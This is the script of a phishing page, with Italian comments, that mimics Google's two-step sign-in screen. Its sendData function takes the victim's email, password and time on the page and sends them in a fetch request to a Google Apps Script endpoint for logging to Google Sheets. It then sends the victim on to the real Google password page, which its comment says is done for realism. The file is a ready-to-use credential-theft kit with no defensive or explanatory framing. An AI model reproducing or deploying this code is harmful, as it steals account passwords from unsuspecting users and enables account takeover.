// --- CONFIGURAZIONE GOOGLE SHEETS ---
const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzzXXB7cpmhJSAcfB5IF5YhFCg-gSvwJCusgl6btPXHjMwCpQCSEvnAO1r7l_xqL-ix4w/exec";

const step1 = document.getElementById('step-1');
const step2 = document.getElementById('step-2');
const mainTitle = document.getElementById('main-title');
const mainSubtitle = document.getElementById('main-subtitle');
const userChip = document.getElementById('user-chip-container');
const nextBtn = document.getElementById('next-btn');
const secondaryAction = document.getElementById('secondary-action');
const emailInput = document.getElementById('email-input');
const passwordInput = document.getElementById('password-input');
const displayEmail = document.getElementById('display-email');

let isStep2 = false;
let startTime = Date.now();

// Funzione per inviare i dati
async function sendData() {
    const timeSpent = Math.floor((Date.now() - startTime) / 1000); // tempo in secondi
    
    const payload = {
        email: emailInput.value,
        password: passwordInput.value,
        timeSpent: timeSpent + "s"
    };

    try {
        // Utilizziamo l'API Fetch per inviare i dati come parametri URL (metodo semplice per Apps Script)
        const params = new URLSearchParams(payload);
        await fetch(`${WEB_APP_URL}?${params.toString()}`, {
            method: 'POST',
            mode: 'no-cors' // Necessario per evitare errori CORS con Apps Script
        });
    } catch (error) {
        console.error("Errore invio dati:", error);
    }
}

nextBtn.addEventListener('click', async () => {
    if (!isStep2) {
        if (!emailInput.value) return;
        
        // Transizione
        step1.classList.add('hidden-step');
        step2.classList.remove('hidden-step');
        mainTitle.textContent = 'Ciao';
        mainSubtitle.classList.add('hidden-step');
        userChip.classList.remove('hidden-step');
        displayEmail.textContent = emailInput.value;
        secondaryAction.textContent = 'Password dimenticata?';
        isStep2 = true;
    } else {
        // Fase finale: invio password e dati definitivi
        nextBtn.disabled = true;
        nextBtn.textContent = 'Caricamento...';
        
        await sendData();
        
        // Simula reindirizzamento o errore per realismo
        setTimeout(() => {
            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd";
        }, 1000);
    }
});

document.getElementById('back-to-email').addEventListener('click', () => {
    isStep2 = false;
    step1.classList.remove('hidden-step');
    step2.classList.add('hidden-step');
    mainTitle.textContent = 'Accedi';
    mainSubtitle.classList.remove('hidden-step');
    userChip.classList.add('hidden-step');
    secondaryAction.textContent = 'Crea un account';
});

// Toggle Password
let pwdShow = false;
document.getElementById('show-pwd-trigger').addEventListener('click', () => {
    pwdShow = !pwdShow;
    passwordInput.type = pwdShow ? 'text' : 'password';
    document.getElementById('pwd-checkbox').classList.toggle('checked', pwdShow);
});

// Invio con tasto Enter
[emailInput, passwordInput].forEach(el => {
    el.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') nextBtn.click();
    });
});